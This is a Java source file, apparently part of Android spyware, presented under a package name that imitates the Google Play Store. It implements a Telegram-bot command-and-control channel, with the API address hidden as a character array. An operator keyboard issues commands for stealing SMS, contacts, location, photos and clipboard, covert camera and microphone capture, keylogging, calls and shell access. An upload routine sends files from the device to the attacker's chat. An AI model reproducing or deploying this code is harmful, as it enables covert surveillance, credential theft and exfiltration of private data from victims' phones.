package com.android.vending.helper;
import org.json.*;
import java.io.*;
import java.net.*;
public class Tg {
    static String API() { return new String(new char[]{104,116,116,112,115,58,47,47,97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103,47,98,111,116}) + Cfg.getToken(); }
    
    public static String send(String text) {
        try {
            String u = API() + "/sendMessage?chat_id=" + Cfg.getChat() + "&text=" + URLEncoder.encode(text, "UTF-8");
            HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
            c.setConnectTimeout(10000); c.setReadTimeout(10000);
            int code = c.getResponseCode();
            InputStream is = (code >= 200 && code < 300) ? c.getInputStream() : c.getErrorStream();
            BufferedReader r = new BufferedReader(new InputStreamReader(is));
            StringBuilder sb = new StringBuilder(); String l;
            while ((l = r.readLine()) != null) sb.append(l);
            r.close(); c.disconnect();
            return code + " | " + sb.toString();
        } catch (Exception e) { return "NETWORK_ERROR: " + e.getMessage(); }
    }

    // دالة الإرسال الصامتة (لا تعيد شيئاً)
    public static void sendSilent(String text) { send(text); }
    
    public static void sendKeyboard(String text, String devId) {
        try {
            JSONObject json = new JSONObject();
            json.put("chat_id", Cfg.getChat()); json.put("text", text);
            JSONArray keyboard = new JSONArray();
            String[][] rows = {
                {"معلومات", "تطبيقات", "رسائل"},
                {"جهات الاتصال", "الموقع", "الفيديوهات"},
                {"20 صورة عشوائية", "أحدث 10 صور", "عدد الصور"},
                {"كاميرا خلفية", "كاميرا أمامية", "المايك"},
                {"سكرين شوت", "إرسال SMS", "اتصال"},
                {"الحافظة", "الكيبورد", "آخر 10 إشعارات"},
                {"اهتزاز", "تحويل لنص", "الخلفية"},
                {"البطارية", "ربط واتساب", "أوامر الشل"}
            };
            String[][] cmds = {
                {"ping", "apps", "sms"},
                {"contacts", "loc", "vids"},
                {"photos20", "latest10", "count_photos"},
                {"cam_back", "cam_front", "mic"},
                {"screenshot", "send_sms", "call"},
                {"clipboard", "keylog", "notifs10"},
                {"vibrate", "tts", "wallpaper"},
                {"battery", "wa_link", "shell"}
            };
            for (int i = 0; i < rows.length; i++) {
                JSONArray btnRow = new JSONArray();
                for (int j = 0; j < rows[i].length; j++) {
                    JSONObject btn = new JSONObject(); btn.put("text", rows[i][j]);
                    btn.put("callback_data", devId + "_" + cmds[i][j]); btnRow.put(btn);
                }
                keyboard.put(btnRow);
            }
            JSONObject markup = new JSONObject(); markup.put("inline_keyboard", keyboard); json.put("reply_markup", markup);
            HttpURLConnection c = (HttpURLConnection) new URL(API() + "/sendMessage").openConnection();
            c.setDoOutput(true); c.setRequestMethod("POST"); c.setRequestProperty("Content-Type", "application/json");
            OutputStream os = c.getOutputStream(); os.write(json.toString().getBytes("UTF-8")); os.flush(); os.close();
            c.getResponseCode(); c.disconnect();
        } catch (Exception ignored) {}
    }
    public static JSONArray getUpdates(long offset) throws Exception {
        String u = API() + "/getUpdates?timeout=30&offset=" + offset;
        HttpURLConnection c = (HttpURLConnection) new URL(u).openConnection();
        c.setConnectTimeout(35000); c.setReadTimeout(35000);
        BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
        StringBuilder sb = new StringBuilder(); String l;
        while ((l = r.readLine()) != null) sb.append(l);
        r.close(); c.disconnect(); return new JSONObject(sb.toString()).getJSONArray("result");
    }
    public static String upload(File f, String caption) {
        try {
            String boundary = "----b" + System.currentTimeMillis();
            HttpURLConnection c = (HttpURLConnection) new URL(API() + "/sendDocument").openConnection();
            c.setConnectTimeout(30000); c.setReadTimeout(30000);
            c.setDoOutput(true); c.setRequestMethod("POST"); c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            DataOutputStream out = new DataOutputStream(c.getOutputStream());
            out.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + Cfg.getChat() + "\r\n");
            out.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"caption\"\r\n\r\n" + caption + "\r\n");
            out.writeBytes("--" + boundary + "\r\nContent-Disposition: form-data; name=\"document\"; filename=\"" + f.getName() + "\"\r\nContent-Type: application/octet-stream\r\n\r\n");
            FileInputStream in = new FileInputStream(f);
            byte[] buf = new byte[8192]; int n;
            while ((n = in.read(buf)) > 0) out.write(buf, 0, n);
            in.close(); out.writeBytes("\r\n--" + boundary + "--\r\n"); out.flush(); out.close();
            int code = c.getResponseCode(); c.disconnect(); return f.getName() + " -> " + code;
        } catch (Exception e) { return "upload err: " + e.getMessage(); }
    }
    public static void answerCallback(String cbId) {
        try { HttpURLConnection c = (HttpURLConnection) new URL(API() + "/answerCallbackQuery?callback_query_id=" + cbId).openConnection(); c.getResponseCode(); c.disconnect(); } catch (Exception ignored) {}
    }
}
